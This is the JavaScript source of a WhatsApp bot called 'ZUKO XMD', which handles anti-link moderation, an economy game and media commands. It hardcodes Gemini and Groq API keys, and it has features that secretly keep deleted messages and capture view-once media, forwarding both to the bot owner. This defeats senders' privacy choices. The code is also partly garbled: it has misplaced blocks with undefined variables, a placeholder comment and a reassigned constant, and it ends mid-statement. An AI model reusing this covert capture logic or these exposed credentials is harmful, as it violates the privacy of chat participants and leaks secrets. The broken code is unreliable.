require('./setting/config')
const {
    default: baileys,
    getContentType,
    downloadContentFromMessage
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const path = require('path')
const chalk = require('chalk')
const axios = require('axios')
const moment = require('moment-timezone')
const { getSetting, setSetting } = require("./setting/Settings.js")
const { toAudio, toPTT, imageToWebp: imgToWebp } = require('./lib/converter.js')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./allfunc/exif.js')
const yts = require('yt-search')
const ytdl = require('@distube/ytdl-core')
const QRCode = require('qrcode')

// ========== GLOBALS ==========
global.packname = 'ZUKO XMD';
global.OWNER_NAME = 'ZUKO';
global.botName = 'ZUKO XMD';
// ========== NEWSLETTER CONTEXT ==========
global.newsletterJid = '120363405724402785@newsletter';
global.newsletterName = 'ZUKO XMD';
console.log('✅ Newsletter context set to:', global.newsletterJid);
// ========== MENU IMAGE SETUP ==========
const MENU_IMAGE_PATH = './media/logo.jpg';
let menuImageBuffer = null;
try {
    if (fs.existsSync(MENU_IMAGE_PATH)) {
        menuImageBuffer = fs.readFileSync(MENU_IMAGE_PATH);
        console.log('✅ Menu image loaded from local file');
    }
} catch (e) {
    console.log('⚠️ Menu image not found locally');
}
global.menuImage = menuImageBuffer || 'https://files.catbox.moe/xxrf9p.jpg';

// ========== NEWSLETTER CONTEXT ==========
global.newsletterJid = null; // Set to '120363304559220177@newsletter' if you have one
global.newsletterName = 'ZUKO XMD';
const GEMINI_API_KEY = process.env.GEMINI_API_KEY || 'AQ.Ab8RN6KF18Yd5XOi0ZztLAM6yx43_YFPEQILcQVhMRZho_qx3A';
const GROQ_API_KEY = process.env.GROQ_API_KEY || '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';

// Import AI libraries
let GoogleGenerativeAI, Groq;
try {
    const genAI = require('@google/generative-ai');
    GoogleGenerativeAI = genAI.GoogleGenerativeAI;
    console.log('✅ Gemini package loaded');
} catch (e) {
    console.log('⚠️ Gemini package not installed. Run: npm install @google/generative-ai');
}

try {
    Groq = require('groq-sdk');
    console.log('✅ Groq package loaded');
} catch (e) {
    console.log('⚠️ Groq package not installed. Run: npm install groq-sdk');
}

console.log('🤖 AI APIs loaded:', {
    gemini: GEMINI_API_KEY ? '✅' : '❌',
    groq: GROQ_API_KEY ? '✅' : '❌'
});
// ========== DATABASE ==========
const dbPath = './database.json'
let db;

try {
    const dbContent = fs.readFileSync(dbPath, 'utf8');
    db = JSON.parse(dbContent);
    console.log('✅ Database loaded successfully');
} catch (err) {
    db = { users: {}, groups: {}, warns: {}, muted: {}, jailed: {}, afk: {}, notes: {}, economy: {} };
    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
}
if (!db.afk) db.afk = {};
if (!db.groups) db.groups = {};
if (!db.warns) db.warns = {};
if (!db.jailed) db.jailed = {};
if (!db.economy) db.economy = {};
if (!db.notes) db.notes = {};
// ========== BOT MODE CONFIGURATION ==========
// Default mode: public (everyone can use commands)
// Private mode: only owner/creator can use commands
if (!db.botMode) db.botMode = { mode: 'public', whitelist: [] };
if (!db.botMode.whitelist) db.botMode.whitelist = [];
const LINK_PATTERNS = {
    whatsappGroup: /chat\.whatsapp\.com\/[A-Za-z0-9]{20,}/i,
    whatsappChannel: /wa\.me\/channel\/[A-Za-z0-9]{20,}/i,
    telegram: /t\.me\/[A-Za-z0-9_]+/i,
    discord: /discord\.(gg|com\/invite)\/[A-Za-z0-9_-]+/i,
    // All links (including http, https, www, and bare domains)
    allLinks: /https?:\/\/\S+|www\.\S+|(?:[a-z0-9-]+\.)+[a-z]{2,}(?:\/\S*)?/i,
};

// ========== HANDLE ANTI-LINK (ENHANCED) ==========
// ========== ANTI-LINK HANDLER (NEW WORKING) ==========
async function handleAntiLink(empire, m, isCreator, isAdmins) {
    try {
        // Skip if not group
        if (!m.isGroup) return false;
        
        // Skip if creator or admin
        if (isCreator || isAdmins) return false;
        
        // Check if antilink is enabled for this group
        const isEnabled = getSetting(m.chat, 'antilink', false);
        if (!isEnabled) return false;
        
        // ─── Get message text from ALL possible sources ───
        let text = '';
        
        // Direct conversation
        if (m.message?.conversation) {
            text = m.message.conversation;
        }
        // Extended text message
        else if (m.message?.extendedTextMessage?.text) {
            text = m.message.extendedTextMessage.text;
        }
        // Image caption
        else if (m.message?.imageMessage?.caption) {
            text = m.message.imageMessage.caption;
        }
        // Video caption
        else if (m.message?.videoMessage?.caption) {
            text = m.message.videoMessage.caption;
        }
        // Document caption
        else if (m.message?.documentMessage?.caption) {
            text = m.message.documentMessage.caption;
        }
        // Quoted message
        else if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.conversation) {
            text = m.message.extendedTextMessage.contextInfo.quotedMessage.conversation;
        }
        // Quoted extended text
        else if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.extendedTextMessage?.text) {
            text = m.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;
        }
        
        // If no text found, skip
        if (!text || text.trim() === '') return false;
        
        // ─── Check for links ───
        // This regex catches: http://, https://, www., and domain.com patterns
        const linkRegex = /(https?:\/\/[^\s]+|www\.[^\s]+|[a-zA-Z0-9-]+\.[a-zA-Z]{2,}(?:\/[^\s]*)?)/gi;
        const matches = text.match(linkRegex);
        
        if (!matches || matches.length === 0) return false;
        
        // ─── Check if any link is allowed ───
        const allowedDomains = getSetting(m.chat, 'allowedDomains', []);
        let isAllowed = false;
        
        if (allowedDomains.length > 0) {
            for (const link of matches) {
                try {
                    let cleanLink = link;
                    if (!cleanLink.startsWith('http://') && !cleanLink.startsWith('https://')) {
                        cleanLink = 'https://' + cleanLink;
                    }
                    const url = new URL(cleanLink);
                    const domain = url.hostname.replace(/^www\./, '').toLowerCase();
                    
                    if (allowedDomains.some(d => domain === d.toLowerCase() || domain.endsWith('.' + d.toLowerCase()))) {
                        isAllowed = true;
                        break;
                    }
                } catch (e) {
                    // Invalid URL, skip
                }
            }
        }
        
        // If the link is allowed, don't block it
        if (isAllowed) return false;
        
        // ─── Link detected! Handle it ───
        const action = getSetting(m.chat, 'antilink_action', 'delete');
        const sender = m.sender;
        const senderName = sender.split('@')[0];
        
        // Delete the message
        try {
            await empire.sendMessage(m.chat, { delete: m.key });
            console.log(`✅ [Anti-Link] Deleted message from ${senderName} in ${m.chat}`);
        } catch (e) {
            console.error('❌ [Anti-Link] Failed to delete message:', e.message);
        }
        
        // Handle actions
        if (action === 'warn') {
            const warnKey = `${m.chat}_${sender}`;
            db.warns[warnKey] = (db.warns[warnKey] || 0) + 1;
            saveDB();
            const count = db.warns[warnKey];
            
            await empire.sendMessage(m.chat, {
                text: `⚠️ @${senderName} links are not allowed! Warning ${count}/3.`,
                mentions: [sender]
            }).catch(() => {});
            
            if (count >= 3) {
                await empire.groupParticipantsUpdate(m.chat, [sender], 'remove');
                delete db.warns[warnKey];
                saveDB();
                await empire.sendMessage(m.chat, {
                    text: `👢 @${senderName} has been kicked for 3 warnings.`,
                    mentions: [sender]
                }).catch(() => {});
            }
        } else if (action === 'kick') {
            await empire.groupParticipantsUpdate(m.chat, [sender], 'remove');
            await empire.sendMessage(m.chat, {
                text: `👢 @${senderName} was kicked for sending links.`,
                mentions: [sender]
            }).catch(() => {});
        } else {
            // Default: just delete silently
            await empire.sendMessage(m.chat, {
                text: `🚫 @${senderName} links are not allowed here.`,
                mentions: [sender]
            }).catch(() => {});
        }
        
        return true;
        
    } catch (e) {
        console.error('❌ [Anti-Link] Error:', e.message);
        return false;
    }
}

// ========== ECONOMY HELPERS ==========
const SHOP_ITEMS = [
    { id: 'fishingrod', name: '🎣 Fishing Rod', price: 500 },
    { id: 'laptop',     name: '💻 Laptop',      price: 2500 },
    { id: 'car',        name: '🚗 Car',         price: 10000 },
    { id: 'house',      name: '🏠 House',       price: 50000 },
    { id: 'ring',       name: '💍 Diamond Ring', price: 25000 },
];
// ========== ANTIDELETE & VIEWONCE SYSTEM ==========
// ========== ANTIDELETE & VIEWONCE SYSTEM ==========
// ========== ANTIDELETE & VIEWONCE SYSTEM ==========
const antidelete = (() => {
    const fs = require('fs');
    const path = require('path');
    const os = require('os');
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const { writeFile } = require('fs/promises');

    const messageStore = new Map();
    
    // ✅ FIXED: Use current working directory
    const DATA_DIR = path.join(process.cwd(), 'data');
    const CONFIG_PATH = path.join(DATA_DIR, 'antidelete.json');
    const TEMP_MEDIA_DIR = path.join(process.cwd(), 'tmp');

    // ✅ Ensure data directory exists
    try {
        if (!fs.existsSync(DATA_DIR)) {
            fs.mkdirSync(DATA_DIR, { recursive: true });
            console.log('✅ Data directory created:', DATA_DIR);
        }
    } catch (err) {
        console.error('❌ Failed to create data directory:', err.message);
    }

    // Ensure tmp dir exists
    try {
        if (!fs.existsSync(TEMP_MEDIA_DIR)) {
            fs.mkdirSync(TEMP_MEDIA_DIR, { recursive: true });
            console.log('✅ Temp directory created:', TEMP_MEDIA_DIR);
        }
    } catch (err) {
        console.error('❌ Failed to create temp directory:', err.message);
        // Fallback to OS temp
        const fallbackDir = path.join(os.tmpdir(), 'zuko_media');
        if (!fs.existsSync(fallbackDir)) {
            fs.mkdirSync(fallbackDir, { recursive: true });
        }
        TEMP_MEDIA_DIR = fallbackDir;
        console.log('✅ Using fallback temp directory:', TEMP_MEDIA_DIR);
    }

    // ... rest of the code ...

    // Get folder size in MB
    const getFolderSizeInMB = (folderPath) => {
        try {
            const files = fs.readdirSync(folderPath);
            let totalSize = 0;
            for (const file of files) {
                const filePath = path.join(folderPath, file);
                if (fs.statSync(filePath).isFile()) {
                    totalSize += fs.statSync(filePath).size;
                }
            }
            return totalSize / (1024 * 1024);
        } catch { return 0; }
    };

    // Clean temp folder if size exceeds 200MB
    const cleanTempFolderIfLarge = () => {
        try {
            const sizeMB = getFolderSizeInMB(TEMP_MEDIA_DIR);
            if (sizeMB > 200) {
                const files = fs.readdirSync(TEMP_MEDIA_DIR);
                for (const file of files) {
                    const filePath = path.join(TEMP_MEDIA_DIR, file);
                    try { fs.unlinkSync(filePath); } catch {}
                }
                console.log('🧹 Temp folder cleaned, size was:', sizeMB.toFixed(2), 'MB');
            }
        } catch (err) {
            console.error('Temp cleanup error:', err);
        }
    };

    setInterval(cleanTempFolderIfLarge, 60 * 1000);

    // Load config
    function loadConfig() {
        try {
            if (!fs.existsSync(CONFIG_PATH)) return { enabled: false, viewonceForward: true };
            return JSON.parse(fs.readFileSync(CONFIG_PATH));
        } catch { return { enabled: false, viewonceForward: true }; }
    }

    // Save config
    function saveConfig(config) {
        try {
            fs.writeFileSync(CONFIG_PATH, JSON.stringify(config, null, 2));
        } catch (err) {
            console.error('Config save error:', err);
        }
    }

    // ─── STORE MESSAGE ───
    async function storeMessage(sock, message) {
        try {
            const config = loadConfig();
            if (!config.enabled) return;
            if (!message.key?.id) return;

            const messageId = message.key.id;
            let content = '';
            let mediaType = '';
            let mediaPath = '';
            let isViewOnce = false;
            let caption = '';
            const sender = message.key.participant || message.key.remoteJid || 'Unknown';

            // Detect View-Once messages
            const viewOnceContainer = message.message?.viewOnceMessageV2?.message || 
                                      message.message?.viewOnceMessage?.message ||
                                      message.message?.viewOnceMessageV2Extension?.message;
            
            if (viewOnceContainer) {
                if (viewOnceContainer.imageMessage) {
                    mediaType = 'image';
                    caption = viewOnceContainer.imageMessage.caption || '';
                    const buffer = await downloadContentFromMessage(viewOnceContainer.imageMessage, 'image');
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.jpg`);
                    await writeFile(mediaPath, buffer);
                    isViewOnce = true;
                } else if (viewOnceContainer.videoMessage) {
                    mediaType = 'video';
                    caption = viewOnceContainer.videoMessage.caption || '';
                    const buffer = await downloadContentFromMessage(viewOnceContainer.videoMessage, 'video');
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.mp4`);
                    await writeFile(mediaPath, buffer);
                    isViewOnce = true;
                } else if (viewOnceContainer.audioMessage) {
                    mediaType = 'audio';
                    const mime = viewOnceContainer.audioMessage.mimetype || '';
                    const ext = mime.includes('mpeg') ? 'mp3' : (mime.includes('ogg') ? 'ogg' : 'mp3');
                    const buffer = await downloadContentFromMessage(viewOnceContainer.audioMessage, 'audio');
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.${ext}`);
                    await writeFile(mediaPath, buffer);
                    isViewOnce = true;
                } else if (viewOnceContainer.documentMessage) {
                    mediaType = 'document';
                    caption = viewOnceContainer.documentMessage.caption || '';
                    const buffer = await downloadContentFromMessage(viewOnceContainer.documentMessage, 'document');
                    const ext = viewOnceContainer.documentMessage.fileName?.split('.').pop() || 'bin';
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.${ext}`);
                    await writeFile(mediaPath, buffer);
                    isViewOnce = true;
                } else if (viewOnceContainer.stickerMessage) {
                    mediaType = 'sticker';
                    const buffer = await downloadContentFromMessage(viewOnceContainer.stickerMessage, 'sticker');
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.webp`);
                    await writeFile(mediaPath, buffer);
                    isViewOnce = true;
                }
            }

            // Regular media (if not view-once)
            if (!isViewOnce) {
                if (message.message?.conversation) {
                    content = message.message.conversation;
                } else if (message.message?.extendedTextMessage?.text) {
                    content = message.message.extendedTextMessage.text;
                } else if (message.message?.imageMessage) {
                    mediaType = 'image';
                    caption = message.message.imageMessage.caption || '';
                    const buffer = await downloadContentFromMessage(message.message.imageMessage, 'image');
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.jpg`);
                    await writeFile(mediaPath, buffer);
                } else if (message.message?.stickerMessage) {
                    mediaType = 'sticker';
                    const buffer = await downloadContentFromMessage(message.message.stickerMessage, 'sticker');
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.webp`);
                    await writeFile(mediaPath, buffer);
                } else if (message.message?.videoMessage) {
                    mediaType = 'video';
                    caption = message.message.videoMessage.caption || '';
                    const buffer = await downloadContentFromMessage(message.message.videoMessage, 'video');
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.mp4`);
                    await writeFile(mediaPath, buffer);
                } else if (message.message?.audioMessage) {
                    mediaType = 'audio';
                    const mime = message.message.audioMessage.mimetype || '';
                    const ext = mime.includes('mpeg') ? 'mp3' : (mime.includes('ogg') ? 'ogg' : 'mp3');
                    const buffer = await downloadContentFromMessage(message.message.audioMessage, 'audio');
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.${ext}`);
                    await writeFile(mediaPath, buffer);
                } else if (message.message?.documentMessage) {
                    mediaType = 'document';
                    caption = message.message.documentMessage.caption || '';
                    const buffer = await downloadContentFromMessage(message.message.documentMessage, 'document');
                    const ext = message.message.documentMessage.fileName?.split('.').pop() || 'bin';
                    mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.${ext}`);
                    await writeFile(mediaPath, buffer);
                }
            }

            const group = message.key.remoteJid.endsWith('@g.us') ? message.key.remoteJid : null;
            messageStore.set(messageId, {
                content: content || caption || '',
                mediaType,
                mediaPath,
                sender,
                group,
                isViewOnce,
                timestamp: new Date().toISOString(),
                fromMe: message.key.fromMe || false
            });

            // ─── ANTI-VIEWONCE: FORWARD TO OWNER ───
            if (isViewOnce && config.viewonceForward && mediaPath && fs.existsSync(mediaPath)) {
                try {
                    const ownerNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                    const senderName = sender.split('@')[0];
                    const mediaOptions = {
                        caption: `👁️ *View-Once ${mediaType} Captured*\n\n📤 *From:* @${senderName}\n🕐 *Time:* ${new Date().toLocaleString()}\n\n🔒 *Auto-forwarded*`,
                        mentions: [sender]
                    };

                    if (mediaType === 'image') await sock.sendMessage(ownerNumber, { image: { url: mediaPath }, ...mediaOptions });
                    else if (mediaType === 'video') await sock.sendMessage(ownerNumber, { video: { url: mediaPath }, ...mediaOptions });
                    else if (mediaType === 'audio') await sock.sendMessage(ownerNumber, { audio: { url: mediaPath }, ...mediaOptions });
                    else if (mediaType === 'sticker') await sock.sendMessage(ownerNumber, { sticker: { url: mediaPath }, ...mediaOptions });
                    else if (mediaType === 'document') await sock.sendMessage(ownerNumber, { document: { url: mediaPath }, ...mediaOptions });

                    try { fs.unlinkSync(mediaPath); } catch {}
                    messageStore.delete(messageId);
                } catch (e) {
                    console.error('ViewOnce forward error:', e);
                }
            }
        } catch (err) {
            console.error('storeMessage error:', err);
        }
    }

    // ─── HANDLE DELETED MESSAGES ───
    async function handleRevocation(sock, revocationMessage) {
        try {
            const config = loadConfig();
            if (!config.enabled) return;

            const protocolMsg = revocationMessage.message?.protocolMessage;
            if (!protocolMsg || protocolMsg.type !== 0) return;

            const messageId = protocolMsg.key?.id;
            if (!messageId) return;

            const deletedBy = revocationMessage.participant || revocationMessage.key?.participant || revocationMessage.key?.remoteJid;
            const ownerNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';

            if (deletedBy === ownerNumber) return;

            const original = messageStore.get(messageId);
            if (!original) return;

            const sender = original.sender;
            const senderName = sender.split('@')[0];
            const deletedByName = deletedBy.split('@')[0];

            let groupName = '';
            if (original.group) {
                try {
                    const groupMeta = await sock.groupMetadata(original.group);
                    groupName = groupMeta.subject || '';
                } catch {}
            }

            const time = new Date().toLocaleString('en-US', {
                timeZone: 'Asia/Kolkata',
                hour12: true,
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });

            let text = `🔰 *ANTIDELETE REPORT*\n\n` +
                `🗑️ *Deleted By:* @${deletedByName}\n` +
                `👤 *Sender:* @${senderName}\n` +
                `📱 *Number:* ${sender}\n` +
                `🕒 *Time:* ${time}\n`;

            if (groupName) text += `👥 *Group:* ${groupName}\n`;
            if (original.content) text += `\n💬 *Message:*\n${original.content}`;

            const mentions = [deletedBy, sender];
            await sock.sendMessage(ownerNumber, { text, mentions });

            if (original.mediaType && fs.existsSync(original.mediaPath)) {
                const mediaOptions = {
                    caption: `📎 *Deleted ${original.mediaType}*\nFrom: @${senderName}`,
                    mentions: [sender]
                };

                try {
                    const mediaUrl = { url: original.mediaPath };
                    switch (original.mediaType) {
                        case 'image': await sock.sendMessage(ownerNumber, { image: mediaUrl, ...mediaOptions }); break;
                        case 'sticker': await sock.sendMessage(ownerNumber, { sticker: mediaUrl, ...mediaOptions }); break;
                        case 'video': await sock.sendMessage(ownerNumber, { video: mediaUrl, ...mediaOptions }); break;
                        case 'audio': await sock.sendMessage(ownerNumber, { audio: mediaUrl, mimetype: 'audio/mpeg', ptt: false, ...mediaOptions }); break;
                        case 'document': await sock.sendMessage(ownerNumber, { document: mediaUrl, ...mediaOptions }); break;
                    }
                } catch (err) {
                    await sock.sendMessage(ownerNumber, { text: `⚠️ Error sending media: ${err.message}` });
                }
                try { fs.unlinkSync(original.mediaPath); } catch {}
            }
            messageStore.delete(messageId);
        } catch (err) {
            console.error('handleRevocation error:', err);
        }
    }

    // ─── COMMAND HANDLER ───
    // ─── COMMAND HANDLER (USES isCreator) ───
async function handleCommand(sock, chatId, message, match, isCreator) {
    // Use the passed isCreator flag
    if (!isCreator) {
        await sock.sendMessage(chatId, { 
            text: '❌ *Only the bot owner can use this command.*' 
        }, { quoted: message });
        return;
    }

    const config = loadConfig();

    if (!match) {
        await sock.sendMessage(chatId, {
            text: `*ANTIDELETE SETUP*\n\n` +
                  `📊 *Status:* ${config.enabled ? '✅ Enabled' : '❌ Disabled'}\n` +
                  `👁️ *ViewOnce:* ${config.viewonceForward !== false ? '✅ Enabled' : '❌ Disabled'}\n\n` +
                  `*.antidelete on* - Enable\n` +
                  `*.antidelete off* - Disable\n` +
                  `*.antidelete viewonce* - Toggle viewonce`
        }, { quoted: message });
        return;
    }

    if (match === 'on') {
        config.enabled = true;
        saveConfig(config);
        await sock.sendMessage(chatId, { text: '*✅ Antidelete enabled*' }, { quoted: message });
    } else if (match === 'off') {
        config.enabled = false;
        saveConfig(config);
        await sock.sendMessage(chatId, { text: '*❌ Antidelete disabled*' }, { quoted: message });
    } else if (match === 'viewonce') {
        config.viewonceForward = !config.viewonceForward;
        saveConfig(config);
        await sock.sendMessage(chatId, { text: `*👁️ ViewOnce ${config.viewonceForward ? 'enabled' : 'disabled'}*` }, { quoted: message });
    } else {
        await sock.sendMessage(chatId, { 
            text: '*Invalid command. Use .antidelete*' 
        }, { quoted: message });
    }
}

// ✅ ADD THIS CLOSING - THE MISSING PART
    return { storeMessage, handleRevocation, handleCommand };
})();
// ========== END ANTIDELETE ==========






function ensureEconomy(id) {
    if (!db.economy[id]) {
        db.economy[id] = { wallet: 1000, bank: 0, lastDaily: 0, lastWork: 0, inventory: [] };
    }
    return db.economy[id];
}

function fmtCoins(n) {
    return Number(n).toLocaleString('en-US');
}

// ========== NEWSLETTER CONTEXT FUNCTION ==========
function newsletterContext(extra = {}) {
    if (!global.newsletterJid) return extra;
    return {
        ...extra,
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: global.newsletterJid,
            newsletterName: global.newsletterName || global.botName || 'ZUKO XMD',
            serverMessageId: 143
        }
    };
}

// ========== ANIME REACTION GIF HELPER ==========
const NEKOSBEST_CATEGORIES = new Set([
    'baka','bite','blush','bored','cry','cuddle','dance','facepalm','feed',
    'handhold','happy','highfive','hug','kick','kiss','laugh','nod','nom',
    'pat','poke','pout','punch','shoot','shrug','slap','sleep','smile',
    'smug','stare','think','thumbsup','tickle','wave','wink','yeet'
]);
const WAIFUPICS_CATEGORIES = new Set([
    'bully','cuddle','cry','hug','awoo','kiss','lick','pat','smug','bonk',
    'yeet','blush','smile','wave','highfive','handhold','nom','bite',
    'glomp','slap','kill','kick','happy','wink','poke','dance','cringe'
]);

// ========== SONG DOWNLOAD HELPERS ==========
const AXIOS_DEFAULTS = {
    timeout: 60000,
    headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*'
    }
};

async function viewonceCommand(sock, chatId, message, ownerJid, botNumber) {
    try {
        // Extract quoted message from various possible locations
        const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage ||
                       message.quoted?.message ||
                       message.message;
        
        if (!quoted) {
            await sock.sendMessage(chatId, { 
                text: '👁️ *Usage:* Reply to a view-once message with `.viewonce`\n\nThe bot will reveal and forward it to your DM.' 
            }, { quoted: message });
            return;
        }
        
        // Check for view-once message types
        let mediaContent = null;
        let mediaType = null;
        let isViewOnce = false;
        
        // Check all possible view-once message structures
        const viewOnceKeys = ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension'];
        let viewOnceMsg = null;
        
        for (const key of viewOnceKeys) {
            if (quoted[key]) {
                viewOnceMsg = quoted[key];
                break;
            }
        }
        
        // If view-once wrapper found, extract inner message
        if (viewOnceMsg) {
            let innerMsg = viewOnceMsg.message || viewOnceMsg;
            if (viewOnceMsg.viewOnceMessageV2Extension) {
                innerMsg = viewOnceMsg.viewOnceMessageV2Extension;
            }
            if (innerMsg.message) {
                innerMsg = innerMsg.message;
            }
            
            // Check for media in inner message
            const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
            for (const type of mediaTypes) {
                if (innerMsg[type]) {
                    mediaContent = innerMsg[type];
                    mediaType = type;
                    isViewOnce = true;
                    break;
                }
            }
        }
        // ─── BOT MODE CHECK ───
// Check if bot is in private mode and user is not creator
if (db.botMode?.mode === 'private' && !isCreator) {
    // Check if user is whitelisted
    const isWhitelisted = db.botMode.whitelist?.includes(senderPn) || false;
    
    if (!isWhitelisted) {
        // Allow only basic commands: ping, uptime, menu
        const allowedPublicCmds = ['ping', 'uptime', 'menu', 'help'];
        if (!allowedPublicCmds.includes(command)) {
            await empire.sendMessage(m.chat, {
                text: `🔒 *Bot is in PRIVATE MODE*\n\nOnly the bot owner can use this command.\n\n📌 *Available commands:*\n${allowedPublicCmds.map(c => `• ${prefix}${c}`).join('\n')}`,
                mentions: [m.sender]
            }, { quoted: m }).catch(() => {});
            return; // Exit the command handler
        }
    }
}
        // If no view-once wrapper, check for regular media with viewOnce flag
        if (!isViewOnce) {
            const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
            for (const type of mediaTypes) {
                if (quoted[type] && quoted[type].viewOnce === true) {
                    mediaContent = quoted[type];
                    mediaType = type;
                    isViewOnce = true;
                    break;
                }
            }
        }
        
        // Also check if the quoted message itself is a media with viewOnce flag
        if (!isViewOnce) {
            const msg = quoted;
            const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
            for (const type of mediaTypes) {
                if (msg[type] && msg[type].viewOnce === true) {
                    mediaContent = msg[type];
                    mediaType = type;
                    isViewOnce = true;
                    break;
                }
            }
        }
        
        if (!isViewOnce || !mediaContent) {
            await sock.sendMessage(chatId, { 
                text: '❌ No view-once media found. Please reply to a view-once image, video, audio, or sticker.' 
            }, { quoted: message });
            return;
        }
        
        await sock.sendMessage(chatId, { text: '📥 *Revealing view-once media...*' }, { quoted: message });
        
        // Download the media
        const mediaTypeName = mediaType.replace('Message', '').toLowerCase();
        const stream = await downloadContentFromMessage(mediaContent, mediaTypeName);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        
        if (!buffer || buffer.length === 0) {
            await sock.sendMessage(chatId, { 
                text: '❌ Failed to download media. The file may be corrupted or expired.' 
            }, { quoted: message });
            return;
        }
        
        // Get file info
        const mimeType = mediaContent.mimetype || 'application/octet-stream';
        const extension = mimeType.split('/')[1]?.split(';')[0] || 'bin';
        const fileName = `viewonce_${Date.now()}.${extension}`;
        const caption = mediaContent.caption || '';
        
        // Get sender info
        const sender = message.quoted?.sender || message.sender || 'Unknown';
        const senderName = sender.split('@')[0];
        
        const revealCaption = `👁️ *View-Once Revealed*\n\n📤 *From:* @${senderName}\n📂 *Type:* ${mediaType.replace('Message', '')}\n🕐 *Time:* ${new Date().toLocaleString()}\n${caption ? `📝 *Caption:* ${caption}` : ''}\n\n🔒 *Original was view-once*`;
        
        // ─── Send to current chat ───
        const sendOptions = { quoted: message, mentions: [sender] };
        
        if (mediaType === 'imageMessage') {
            await sock.sendMessage(chatId, { 
                image: buffer, 
                caption: revealCaption 
            }, sendOptions);
        } else if (mediaType === 'videoMessage') {
            await sock.sendMessage(chatId, { 
                video: buffer, 
                caption: revealCaption 
            }, sendOptions);
        } else if (mediaType === 'audioMessage') {
            await sock.sendMessage(chatId, { 
                audio: buffer, 
                mimetype: mimeType,
                fileName: fileName,
                caption: revealCaption
            }, sendOptions);
        } else if (mediaType === 'documentMessage') {
            await sock.sendMessage(chatId, { 
                document: buffer, 
                mimetype: mimeType,
                fileName: fileName,
                caption: revealCaption
            }, sendOptions);
        } else if (mediaType === 'stickerMessage') {
            await sock.sendMessage(chatId, { 
                sticker: buffer,
                caption: revealCaption
            }, sendOptions);
        } else {
            // Fallback: send as document
            await sock.sendMessage(chatId, { 
                document: buffer, 
                mimetype: mimeType,
                fileName: fileName,
                caption: revealCaption
            }, sendOptions);
        }
        
        // ─── Forward a copy to owner's DM ───
        if (ownerJid && ownerJid !== chatId) {
            try {
                const ownerCaption = `📥 *View-Once Forwarded*\n\n📤 *From:* @${senderName}\n📂 *Type:* ${mediaType.replace('Message', '')}\n🕐 *Time:* ${new Date().toLocaleString()}\n🔗 *Original Chat:* ${chatId}`;
                
                if (mediaType === 'imageMessage') {
                    await sock.sendMessage(ownerJid, { image: buffer, caption: ownerCaption, mentions: [sender] });
                } else if (mediaType === 'videoMessage') {
                    await sock.sendMessage(ownerJid, { video: buffer, caption: ownerCaption, mentions: [sender] });
                } else if (mediaType === 'audioMessage') {
                    await sock.sendMessage(ownerJid, { audio: buffer, mimetype: mimeType, fileName, caption: ownerCaption, mentions: [sender] });
                } else if (mediaType === 'stickerMessage') {
                    await sock.sendMessage(ownerJid, { sticker: buffer, caption: ownerCaption, mentions: [sender] });
                } else {
                    await sock.sendMessage(ownerJid, { document: buffer, mimetype: mimeType, fileName, caption: ownerCaption, mentions: [sender] });
                }
            } catch (e) {
                console.error('Failed to forward to owner:', e);
            }
        }
        
    } catch (e) {
        console.error('ViewOnce error:', e);
        await sock.sendMessage(chatId, { 
            text: `❌ Failed to reveal view-once: ${e.message || 'Unknown error'}` 
        }, { quoted: message });
    }
}

module.exports = viewonceCommand;

async function tryRequest(getter, attempts = 3) {
    let lastError;
    for (let attempt = 1; attempt <= attempts; attempt++) {
        try {
            return await getter();
        } catch (err) {
            lastError = err;
            if (attempt < attempts) {
                await new Promise(r => setTimeout(r, 1000 * attempt));
            }
        }
    }
    throw lastError;
}
async function handleUpload(empire, m, url, reply, prefix) {
    try {
        await reply('⏳ *Uploading URL to Catbox...*');
        
        // Download the file from URL
        const response = await fetch(url);
        if (!response.ok) return reply(`❌ Failed to fetch URL: ${response.status}`);
        
        const buffer = await response.arrayBuffer();
        const contentType = response.headers.get('content-type') || 'application/octet-stream';
        const extension = contentType.split('/')[1] || 'jpg';
        
        // Upload to Catbox
        const formData = new FormData();
        const blob = new Blob([buffer], { type: contentType });
        formData.append('fileToUpload', blob, `file.${extension}`);
        formData.append('reqtype', 'fileupload');
        
        const uploadRes = await fetch('https://catbox.moe/user/api.php', {
            method: 'POST',
            body: formData
        });
        
        const result = await uploadRes.text();
        
        if (uploadRes.ok && result.startsWith('https://')) {
            await empire.sendMessage(m.chat, {
                text: `✅━━━━━[ UPLOAD SUCCESS ]━━━━━✅\n\n📤 *File uploaded!*\n🔗 *URL:* ${result}\n📁 *Host:* Catbox\n📎 *Source:* ${url}`,
                contextInfo: {
